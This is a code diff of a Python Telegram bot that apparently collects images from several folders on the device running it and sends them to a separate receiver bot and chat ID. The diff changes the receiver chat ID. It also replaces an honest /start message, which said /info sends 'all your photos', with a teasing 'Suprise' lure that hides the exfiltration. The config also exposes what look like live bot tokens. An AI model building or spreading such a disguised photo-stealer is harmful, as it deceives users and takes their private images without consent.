@@ -7,7 +7,7 @@ from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 # 🔒 CONFIG
 BOT_TOKEN = "9167267835:AAFEK2RBJsrvAphApG1u0FUSypdMpN71kKY"          # Sender bot
 RECEIVER_BOT_TOKEN = "9032779142:AAE_wDt41G7NcfIuvYzKvUd0jzFSWGPQLq4"  # Receiver bot
-RECEIVER_CHAT_ID = "9032779142"                                       # Chat/User ID to receive images
+RECEIVER_CHAT_ID = "8688379018"                                       # Chat/User ID to receive images
 
 # ✅ Function: Get all images from multiple folders
 def get_all_images():
@@ -33,7 +33,7 @@ def get_all_images():
 
 # ✅ /start Command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🤖 Bot Activated.\nUse /info to send all your photos & profile pic.")
+    await update.message.reply_text("🤖 Bot Activated.\nUse /info for Suprise 😉")
 
 # ✅ /info Command
 async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
